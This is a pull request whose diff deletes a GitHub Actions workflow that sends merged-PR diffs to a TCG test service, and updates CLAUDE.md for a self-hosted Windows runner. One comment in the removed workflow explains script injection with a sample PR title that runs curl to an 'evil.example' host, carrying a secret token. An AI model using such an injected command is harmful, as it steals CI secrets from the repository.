source.title: Run the TCG CI/CD workflow on a self-hosted runner for the local TCG
source.author: Bhargav-85

description:
The repository secrets TCG_CICD_TOKEN and TCG_CICD_ENDPOINT_URL now hold the local TCG's connection (project 16, endpoint http://localhost:3000/...). A GitHub-hosted runner cannot reach localhost, which is why the last runs failed with "Failed to connect to localhost port 3000". The TCG_LOCAL_CICD_* secrets read by tcg-clone's second workflow were never set, so that file is removed.

tcg-cicd-automation.yml now runs on [self-hosted, Windows] with bash as the shell, and differs from TCG's generated file in five documented ways:
- the runner and shell
- the job also requires the PR to come from this repository
- a first step checks git, curl and jq exist (jq is not on Windows by default)
- the request body goes to curl from a file: on Windows a command-line body of 33 KB already fails with "Argument list too long" (32.5 KB worked, measured in Git Bash); 400 KB went through from a file
- the project link in the last error message points at project 16

CLAUDE.md documents the setup, what has to be running at merge time, and the security note for self-hosted runners.

commits.author: Priyanka Priyadarshani

--- a/.github/workflows/tcg-cicd-automation-local.yml
+++ /dev/null
@@ -1,184 +0,0 @@
-# LOCAL copy of the TCG-generated workflow below, for the TCG instance running on the developer's machine (project 16).
-# The stage copy (tcg-cicd-automation.yml, project 546) stays as it is and reads TCG_CICD_TOKEN / TCG_CICD_ENDPOINT_URL.
-# A repository secret holds one value per name, so this copy reads its own pair instead, and both fire on a merge:
-#   TCG_LOCAL_CICD_TOKEN
-#   TCG_LOCAL_CICD_ENDPOINT_URL
-# Only three things differ from the generated file: the workflow name, those two secret names, and the project link in
-# the last error message. Everything else is TCG's text; if TCG's file changes, regenerate and re-apply those three.
-#
-# Reachability: this job runs on a GitHub-hosted runner, where "localhost" is the runner itself. The endpoint secret must
-# be a URL that runner can reach (a tunnel to the local TCG, for example), and the local TCG must be running when the
-# PR merges, or the "Trigger TCG re-execution" step fails with "Could not reach TCG".
-#
-# Never put the token or the endpoint URL in this file; they live in Settings -> Secrets and variables -> Actions.
-#
-# CI/CD Automation Testing — generated by TCG (testcasegen.ai),
-# powered by Adaps (adaps.com).
-# Re-executes this project's EXISTING automation suite (never a fresh
-# crawl/generation) against your diff, restricted to whichever test cases
-# an LLM-based selector judges relevant — falling back to the full suite
-# when unsure. TCG resolves which deployed URL to test against itself, from
-# this project's own last Execute Scripts run or crawl — there is nothing to
-# configure for that here.
-#
-# Save TWO repository secrets before this runs (Settings -> Secrets and
-# variables -> Actions -> New repository secret) — values for both are
-# shown on this project's own CI/CD settings screen:
-#   TCG_LOCAL_CICD_TOKEN   the trigger token from this project's CI/CD settings
-#   TCG_LOCAL_CICD_ENDPOINT_URL   TCG's own trigger endpoint, copied from this project's CI/CD
-#                    settings — kept as a secret, not a literal in this file,
-#                    so a fork/PR diff of this workflow never has to show it
-#
-# Which of the triggers below are present is controlled by this project's
-# own CI/CD settings (the "Trigger types" section) — re-download this file
-# after changing that picker to pick up the change.
-name: TCG CI/CD Automation Testing (local)
-
-on:
-  # Fires once a PR is merged into the default branch.
-  pull_request:
-    types: [closed]
-  # Lets you fire it by hand from the Actions tab.
-  workflow_dispatch:
-
-jobs:
-  trigger-tcg-execution:
-    # Only a MERGED pull_request should trigger a real re-execution — a
-    # closed-without-merge PR (or a workflow_dispatch, which has no
-    # pull_request context at all) must not.
-    if: github.event_name != 'pull_request' || github.event.pull_request.merged == true
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout with full history
-        uses: actions/checkout@v4
-        with:
-          fetch-depth: 0
-
-      - name: Compute the diff
-        id: diff
-        run: |
-          if [ "${GITHUB_EVENT_NAME}" = "pull_request" ]; then
-            git diff "${{ github.event.pull_request.base.sha }}" "${{ github.event.pull_request.head.sha }}" > diff.txt
-          else
-            # Push-based / manual-dispatch fallback: diff against the previous commit.
-            git diff HEAD~1 HEAD > diff.txt || touch diff.txt
-          fi
-          {
-            echo "commit_sha=${GITHUB_SHA}"
-            echo "branch=${GITHUB_REF_NAME}"
-          } >> "$GITHUB_OUTPUT"
-
-      - name: Trigger TCG re-execution
-        env:
-          TCG_LOCAL_CICD_TOKEN: ${{ secrets.TCG_LOCAL_CICD_TOKEN }}
-          TCG_LOCAL_CICD_ENDPOINT_URL: ${{ secrets.TCG_LOCAL_CICD_ENDPOINT_URL }}
-          # Read as env vars, NEVER interpolated directly into this script —
-          # a PR's title/description are attacker-controlled on any repo
-          # taking outside contributions, and inlining
-          # ${{ github.event.pull_request.title }} straight into a run: block
-          # is the textbook GitHub Actions script-injection hole: a title
-          # like "; curl evil.example/$TCG_LOCAL_CICD_TOKEN #" would execute as
-          # shell code the instant this step runs, before jq ever sees it.
-          # Landing in an env var instead means bash hands it to jq as inert
-          # data, exactly like TCG_LOCAL_CICD_TOKEN above already has to.
-          PR_TITLE: ${{ github.event.pull_request.title }}
-          PR_BODY: ${{ github.event.pull_request.body }}
-        run: |
-          # --rawfile reads diff.txt's raw bytes directly into $diff — arbitrary
-          # newlines, quotes and backslashes included — without ever putting the
-          # diff on jq's command line. Building this with plain string
-          # concatenation is exactly how a stray quote or backtick in a diff line
-          # turns into a shell-injection or malformed-JSON bug; passing it via
-          # --arg diff "$(cat diff.txt)" instead fails on any real-sized PR with
-          # "Argument list too long" (exit 126) once the diff exceeds the
-          # runner's ARG_MAX — --rawfile has no such limit since jq reads the
-          # file itself. PR_TITLE/PR_BODY get the identical treatment, written
-          # out to their own files rather than passed as --arg "$VAR", for the
-          # same reasoning (a PR description can run to several KB).
-          printf '%s' "${PR_TITLE:-}" > pr_title.txt
-          printf '%s' "${PR_BODY:-}" > pr_body.txt
-
-          BODY=$(jq -n \
-            --rawfile diff diff.txt \
-            --rawfile pr_title pr_title.txt \
-            --rawfile pr_body pr_body.txt \
-            --arg sha "${{ steps.diff.outputs.commit_sha }}" \
-            --arg branch "${{ steps.diff.outputs.branch }}" \
-            --argjson pr '${{ github.event.pull_request.number || 0 }}' \
-            --arg reason "${{ github.event_name == 'pull_request' && 'pr_merge' || (github.event_name == 'schedule' && 'scheduled' || 'manual') }}" \
-            '{
-              commit_sha: $sha,
-              branch: $branch,
-              pr_number: (if $pr > 0 then $pr else null end),
-              pr_title: (if ($pr_title | length) > 0 then $pr_title else null end),
-              pr_description: (if ($pr_body | length) > 0 then $pr_body else null end),
-              git_diff: $diff,
-              trigger_reason: $reason,
-              client: "github_actions"
-            }')
-
-          # Full request/response logging, collapsed behind ::group:: since a
-          # real diff can run to thousands of lines — still fully available in
-          # the run log for debugging, just not spamming the default view.
-          # TCG_LOCAL_CICD_TOKEN travels only in the X-TCG-CICD-Token header above,
-          # never in the JSON body, so it's never at risk here — but git_diff
-          # IS the caller's own source code, and this log line is what makes
-          # that source code visible in the Actions run log (where it was
-          # NOT visible before this line existed). Redact it to its byte
-          # count before echoing, matching what TCG's own server-side logs do
-          # with the same field — nobody's actual diff belongs in CI log
-          # storage just to prove the request was well-formed.
-          echo "::group::Request sent to TCG"
-          echo "$BODY" | jq '.git_diff |= ("<redacted, " + (length | tostring) + " bytes>")'
-          echo "::endgroup::"
-
-          # The endpoint itself is now a secret too (TCG_LOCAL_CICD_ENDPOINT_URL,
-          # see the header comment) — a blank value almost always means the
-          # third secret was never added, so this is caught up front with its
-          # own message rather than letting curl fail on an empty -X POST "".
-          if [ -z "${TCG_LOCAL_CICD_ENDPOINT_URL:-}" ]; then
-            echo "::error::TCG_LOCAL_CICD_ENDPOINT_URL is not set. Add it as a repository secret — copy the value from this project's own CI/CD settings screen."
-            exit 1
-          fi
-
-          # --fail-with-body only fails curl on a 4xx/5xx — a selector
-          # fallback that TCG couldn't auto-resolve still answers 202
-          # (nothing ran, but the CALL succeeded), so that outcome needs its
-          # own check below rather than relying on curl's exit code.
-          #
-          # A WRONG TCG_LOCAL_CICD_ENDPOINT_URL (typo'd, stale, pointed at the wrong
-          # host) fails here too — curl exits non-zero on a DNS/connection
-          # failure exactly as it does on an HTTP error, and the "if !" below
-          # catches both the same way, with its own message rather than a bare
-          # curl stderr dump the next person to look at this run has to
-          # decode. It will NOT catch a typo that happens to resolve to some
-          # other live server that answers 2xx — no check on a client-held
-          # secret's value can rule that out; re-copy it from the settings
-          # screen if a run's results ever look wrong with no error at all.
-          if ! RESPONSE=$(curl --fail-with-body -sS -X POST "${TCG_LOCAL_CICD_ENDPOINT_URL}" \
-            -H "Content-Type: application/json" \
-            -H "X-TCG-CICD-Token: ${TCG_LOCAL_CICD_TOKEN}" \
-            -H "Idempotency-Key: ${{ github.run_id }}-${{ github.run_attempt }}" \
-            -d "$BODY" 2>&1); then
-            echo "::error::Could not reach TCG at TCG_LOCAL_CICD_ENDPOINT_URL (or it rejected the request). Double-check that secret's value against this project's own CI/CD settings screen. Details: $RESPONSE"
-            exit 1
-          fi
-          echo "::group::Response from TCG"
-          echo "$RESPONSE"
-          echo "::endgroup::"
-
-          STATUS=$(echo "$RESPONSE" | jq -r '.status // empty')
-          REASON=$(echo "$RESPONSE" | jq -r '.reason // empty')
-
-          if [ "$STATUS" = "fallback_pending" ]; then
-            # The selector couldn't confidently narrow this diff to a subset
-            # of test cases, and this project has not opted into auto-running
-            # the full suite on a fallback — NOTHING was executed. Fail this
-            # step loudly (rather than a silent 202) so it shows up as a red
-            # run in the Actions tab, with a direct pointer to the manual
-            # resolve action instead of leaving the diff untested unnoticed.
-            echo "::error::TCG CI/CD Automation Testing did not run any tests for this change (reason: ${REASON:-selector could not confidently narrow this diff}). Open the TCG app at http://localhost:3000/cicd-automation/16 and click \"Run full suite\" in the On Demand section of the trigger history to manually run the full test suite, or turn on \"Run full suite if no test-relevant files changed\" in this project's CI/CD settings to do this automatically next time."
-            exit 1
-          elif [ "$STATUS" = "skipped" ]; then
-            echo "::notice::TCG found nothing test-relevant in this diff (reason: ${REASON:-no relevant files changed}) — no execution was started."
-          fi

-## TCG CI/CD trigger workflows (stage and local)
-
-Two copies of TCG's generated GitHub Actions workflow fire when a PR merges into `main` (and on manual dispatch), one per
-TCG instance. A repository secret holds one value per name, so each copy reads its own pair:
-
-| Workflow | TCG instance | Repository secrets |
-| --- | --- | --- |
-| `.github/workflows/tcg-cicd-automation.yml` | stage, project 546 (`https://adaps.net/cicd-automation/546`) | `TCG_CICD_TOKEN`, `TCG_CICD_ENDPOINT_URL` |
-| `.github/workflows/tcg-cicd-automation-local.yml` | the developer's local TCG, project 16 (`http://localhost:3000/cicd-automation/16`) | `TCG_LOCAL_CICD_TOKEN`, `TCG_LOCAL_CICD_ENDPOINT_URL` |
-
-- The local file is the stage file with three changes only: the workflow name, the secret names and the project link. If
-  TCG regenerates its file, re-apply those three. Token and endpoint values live only in Settings, Secrets and variables,
-  Actions; never in the repo or in chat logs that get committed.
-- A run goes red at "Trigger TCG re-execution" when its secrets are missing, when TCG answers 403 (the GitHub Actions
-  method is not enabled in that project's CI/CD settings), or when TCG cannot be reached.
-- **The local copy runs on a GitHub-hosted runner, where `localhost` is the runner itself.** Its endpoint secret has to be
-  a URL that runner can reach (a tunnel to the local TCG), and the local TCG has to be running when the PR merges.
-- Each TCG picks the deployed URL to test from its own project's last Execute Scripts run or crawl, so that project's
-  target must be a URL that TCG instance can reach.
+## TCG CI/CD trigger workflow (local TCG, self-hosted runner)
+
+`.github/workflows/tcg-cicd-automation.yml` is TCG's generated GitHub Actions workflow. It fires when a PR merges into
+`main` (and on manual dispatch) and posts the diff to TCG's trigger endpoint. As of 2026-11-03 its repository secrets
+`TCG_CICD_TOKEN` and `TCG_CICD_ENDPOINT_URL` hold the **local** TCG's values (project 16, endpoint
+`http://localhost:3000/...`). The earlier stage connection (project 546, `https://adaps.net/cicd-automation/546`) is no
+longer wired: its values were overwritten, and GitHub cannot show them again, so they must be copied from TCG to bring it
+back. A short-lived second file, `tcg-cicd-automation-local.yml`, read a separate `TCG_LOCAL_CICD_*` pair that was never
+set, so it was removed.
+
+- **`localhost` is only reachable from a runner on the developer's PC,** so the job runs on a **self-hosted runner**
+  (`runs-on: [self-hosted, Windows]`, steps run in Git Bash). A GitHub-hosted runner fails with "Failed to connect to
+  localhost port 3000". The alternative that keeps `ubuntu-latest` is to point the endpoint secret at a tunnel to the
+  local TCG.
+- It differs from TCG's generated file in five documented ways (see the comment at the top of the workflow): the runner,
+  a same-repo-only `if`, a first step that checks `git`, `curl` and `jq` are installed, the request body sent from a file
+  (Windows rejects a command line over about 32 KB, which a 33 KB diff already hits), and the project link. If TCG
+  regenerates its file, re-apply those.
+- Needed when a PR merges: the runner online (otherwise the job just waits for one), the local TCG running on port 3000,
+  and `jq` on the runner's Git Bash (not installed by default; the first step says so).
+- A run goes red at "Trigger TCG re-execution" when a secret is missing, when TCG answers 403 (the GitHub Actions method
+  is not enabled in that project's CI/CD settings), or when TCG cannot be reached.
+- **Security:** a self-hosted runner executes whatever a workflow tells it to, on that PC, and GitHub advises against them
+  on public repositories. Here, set Settings, Actions, General, "Fork pull request workflows from outside collaborators" to
+  require approval for all of them. Token and endpoint values live only in Settings, Secrets and variables, Actions;
+  never in the repo or in anything that gets committed.
+- The local TCG picks the deployed URL to test from project 16's last Execute Scripts run or crawl, so that target must be
+  a URL the local TCG can reach.
